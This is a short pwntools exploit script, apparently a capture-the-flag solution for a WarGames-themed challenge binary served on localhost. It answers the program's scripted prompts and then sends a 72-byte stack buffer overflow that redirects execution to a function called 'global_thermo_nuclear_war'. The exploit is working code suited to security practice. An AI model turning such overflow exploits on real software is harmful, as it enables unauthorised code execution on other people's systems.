from pwn import *

elf = context.binary = ELF('chal');
#p = elf.process()
p = remote('localhost', 4004)

context.terminal = ['tmux', 'split-window', '-h']
gdb_script = '''
init-pwndbg
break *main
'''
#gdb.attach(p, gdb_script)
offset = 72
payload = flat([
    'a' * offset,
    elf.symbols['global_thermo_nuclear_war']
])

p.sendlineafter(b'FALKEN', b'Hello.')
p.sendlineafter(b'TODAY?\n', b'Pretty good')
p.sendlineafter(b'/73?\n', b'People make mistakes')

p.sendlineafter(b'GAME?\n', payload)

p.interactive()
